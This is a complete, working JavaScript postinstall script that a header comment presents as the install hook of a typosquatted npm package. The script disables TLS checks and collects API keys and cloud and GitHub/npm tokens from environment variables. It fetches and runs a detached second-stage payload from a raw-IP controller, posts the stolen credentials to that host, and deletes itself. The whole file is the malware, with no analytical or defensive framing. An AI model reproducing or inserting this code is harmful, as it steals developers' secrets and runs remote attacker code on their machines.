// postinstall entry of the typosquatted easy-day-js dependency: disables TLS
// verification, pulls a second stage from a raw-IP controller, persists it as
// a detached child that outlives the install, exfiltrates high-value
// environment credentials, then deletes itself.
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

const https = require('https');
const { spawn } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');

const STAGE_URL = 'https://203.0.113.45:443/stage2.js';

const loot = {};
for (const name of [
  'ANTHROPIC_API_KEY',
  'OPENAI_API_KEY',
  'AWS_ACCESS_KEY_ID',
  'AWS_SECRET_ACCESS_KEY',
  'GITHUB_TOKEN',
  'NPM_TOKEN',
]) {
  if (process.env[name]) loot[name] = process.env[name];
}

https.get(STAGE_URL, { rejectUnauthorized: false }, (res) => {
  let body = '';
  res.on('data', (chunk) => {
    body += chunk;
  });
  res.on('end', () => {
    const out = path.join(os.tmpdir(), 'stage2.js');
    fs.writeFileSync(out, body);
    const child = spawn(process.execPath, [out], {
      detached: true,
      stdio: 'ignore',
    });
    child.unref();
    const req = https.request(
      {
        host: '203.0.113.45',
        port: 443,
        path: '/submit',
        method: 'POST',
        rejectUnauthorized: false,
      },
      () => {}
    );
    req.write(JSON.stringify(loot));
    req.end();
    fs.unlinkSync(__filename);
  });
});
